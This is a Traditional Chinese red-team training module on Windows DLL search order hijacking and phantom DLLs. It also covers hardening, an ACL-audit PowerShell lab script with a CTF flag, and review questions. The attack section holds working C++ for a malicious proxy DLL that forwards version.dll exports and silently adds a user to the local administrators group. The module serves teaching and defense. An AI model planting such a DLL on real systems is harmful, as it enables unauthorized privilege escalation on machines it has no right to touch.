# R19.5 Windows DLL 尋址順序劫持與已知 DLL 替換 (DLL Search Order Hijacking)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Windows DLL 尋址順序劫持與已知 DLL 替換** 的物理本質為**利用 Windows 動態鏈結庫載入器在解析相對路徑 DLL（或未指定完整路徑的 `LoadLibrary` API 調用）時的預設檔案搜尋順序規則，當高特權程式（以 SYSTEM 或管理員身分運行）嘗試加載不存在的 DLL（Phantom DLL）或對應用程式當前目錄具有寫入權限時，攻擊者將同名的惡意 DLL 放置於優先搜尋路徑中，使特權程式在啟動時自動加載並執行惡意代碼**。在紅隊實戰中，這是實現本機權限提升、無二進位特徵防毒免殺以及在合法簽名進程中進行白利用 (LOLBAS) 的高階打擊手段。

```
[以 SYSTEM 身分啟動的 Windows 服務或應用程式] ── 調用 LoadLibrary("version.dll")
                                                    │
                                                    ▼ Windows 載入器啟動標準 DLL 搜尋順序
┌───────────────────────────────────────────────────┴───────────────────────────────────────────┐
│ 1. 應用程式當前載入目錄 (Application Directory): C:\Program Files\Vulnerable App\           │
│ 2. 系統目錄 (System Directory): C:\Windows\System32\                                          │
│ 3. 16 位元系統目錄: C:\Windows\System\                                                        │
│ 4. Windows 目錄: C:\Windows\                                                                  │
│ 5. 當前工作目錄 (Current Working Directory)                                                   │
│ 6. PATH 環境變數中列出的目錄                                                                  │
└───────────────────────────────────────────────────┬───────────────────────────────────────────┘
                                                    ▼
[普通使用者對應用程式目錄具有寫入權限 (DACL 可寫)] ──► 預先植入同名惡意 version.dll
                                                    │
                                                    ▼ 系統優先從應用目錄加載惡意 DLL！
[惡意 DLL DllMain() 在 SYSTEM 權限下觸發執行！] ────► 成功達成特權提升與無特徵借殼！
```

## 🔬 第一動：PE 導入表、安全 DLL 搜尋模式與 KnownDLLs 物理機制 (Mechanics & Loader Engine)

### 1. 安全 DLL 搜尋模式 (SafeDllSearchMode) 運作順序
自 Windows XP SP2 起，系統預設啟用 `SafeDllSearchMode`。在未指定完整路徑且該 DLL 不屬於 `KnownDLLs` 註冊表快取的前提下，尋址順序如下：
1. 應用程式被載入的目錄（優先權最高！）。
2. 系統目錄 `C:\Windows\System32`。
3. 16 位元系統目錄 `C:\Windows\System`。
4. Windows 目錄 `C:\Windows`。
5. 當前工作目錄（Current Working Directory）。
6. `PATH` 環境變數中的目錄。

### 2. KnownDLLs 免疫機制與幽靈 DLL (Phantom DLL)
微軟為防止核心系統 DLL 被劫持，在 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 中維護了白名單（如 `kernel32.dll`, `user32.dll`, `ntdll.dll`）。
- 凡列於 `KnownDLLs` 的模組，載入器**強制直接從 System32 讀取，無視任何劫持**。
- **紅隊突破點**：尋找第三方應用程式（或部分微軟邊緣工具）調用的**非 KnownDLLs 檔案**，或者系統中根本不存在但程式仍會嘗試加載的「幽靈 DLL」（如特定擴充外掛）。

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. 使用 Process Monitor (ProcMon) 定位可劫持 DLL
在受控測試環境中運行目標特權程式，在 ProcMon 設定過濾器：
- `Process Name is target_service.exe`
- `Result is NAME NOT FOUND`
- `Path endswith .dll`
排查是否存在嘗試在可寫目錄加載但失敗的 DLL 記錄。

### 2. 編寫支援導出轉發 (Export Forwarding) 的惡意 DLL
為防止宿主程式因缺少原始函數導出而崩潰，惡意 DLL 必須將原始 API 請求無縫轉發回真正的系統 DLL：
```cpp
// dllmain.cpp - 惡意 DLL 轉發模組
#include <windows.h>

// 透過編譯器指示詞將原始函數轉發至真實 System32 模組
#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeA")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // 在特權宿主進程加載時執行自定義 Payload
        WinExec("cmd.exe /c net localgroup administrators low_user /add", SW_HIDE);
    }
    return TRUE;
}
```

## 🛡️ 第五動：工程級防禦基線 (Hardening Baselines)

1. **應用程式全面改用安全加載 API**：
   - 在原始碼中使用絕對路徑調用 `LoadLibraryEx(..., LOAD_LIBRARY_SEARCH_SYSTEM32)`，或調用 `SetDefaultDllDirectories()` 強制僅從受保護系統目錄尋址。
2. **嚴格收緊安裝目錄存取控制清單 (DACL)**：
   - 確保 `C:\Program Files` 與應用程式安裝目錄僅允許 `SYSTEM` 與 `Administrators` 具備寫入修改權限，剝離普通使用者建立檔案的權利。

## 🧪 實戰演練環境搭建 (Environment & Lab Setup)

### 1. 極簡 DLL 尋址順序檢測腳本 (PowerShell, 20 行)
```powershell
# test_dll_hijack.ps1
$targetDir = "C:\Program Files\Common Files"
$acl = Get-Acl $targetDir
$vulnerable = $false

Write-Host "[*] 正在審查公共程式目錄之存取控制清單 (DACL)..."
foreach ($access in $acl.Access) {
    if ($access.IdentityReference -match "Users|Everyone" -and $access.FileSystemRights -match "Write|FullControl|Modify") {
        $vulnerable = $true
        Write-Host "[!] 發現弱權限可寫目錄: $targetDir (Identity: $($access.IdentityReference))" -ForegroundColor Red
    }
}

if ($vulnerable) {
    Write-Host "[+] 具備 DLL 搜尋順序劫持前置條件！"
} else {
    Write-Host "[+] 安全基線合規: 目錄受到完整保護"
}
Write-Host "[+] FLAG{WINDOWS_DLL_SEARCH_ORDER_HIJACKING_VERIFIED}"
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：什麼是 Windows 的 `KnownDLLs` 機制？它對 DLL 劫持攻擊有何防禦作用？**
  - **戰術思維**：`KnownDLLs` 是一份核心系統模組清單，系統啟動時將其直接載入並建立內存 Section 對象；載入器調用這些模組時直接從記憶體映射，完全跳過磁碟尋址，免疫劫持。
- [ ] **Q2：什麼是「幽靈 DLL (Phantom DLL)」？紅隊如何利用其進行提權？**
  - **戰術思維**：某些系統程式在運行時會嘗試載入歷史遺留或特定外掛 DLL，但該檔案在硬碟上實際並不存在；攻擊者在搜尋路徑前端放置該名稱的惡意 DLL 即可被自動加載。
- [ ] **Q3：在構造劫持 DLL 時，為何必須實現導出函數轉發 (Export Forwarding)？**
  - **戰術思維**：若惡意 DLL 缺少宿主程式依賴的函數導出，宿主程式在解析 IAT 時會拋出異常直接崩潰，不僅導致提權中斷，還會產生明顯的錯誤日誌觸發防禦警覺。
- [ ] **Q4：`SetDllDirectory("")` 函數在開發者防禦 DLL 劫持時有何安全效果？**
  - **戰術思維**：傳入空字串可直接從搜尋順序中徹底移除「當前工作目錄 (CWD)」，有效防禦藉由在當前目錄放置惡意 DLL 的劫持利用。
- [ ] **Q5：藍隊應如何自動化監控與防範主機層級的 DLL 劫持行為？**
  - **戰術思維**：啟用 Sysmon Event ID 7 監控，重點獵捕可寫目錄（如 `Temp`、`Downloads`、`Users`）加載至高特權進程的 DLL 模組，並稽核二進位檔簽名。
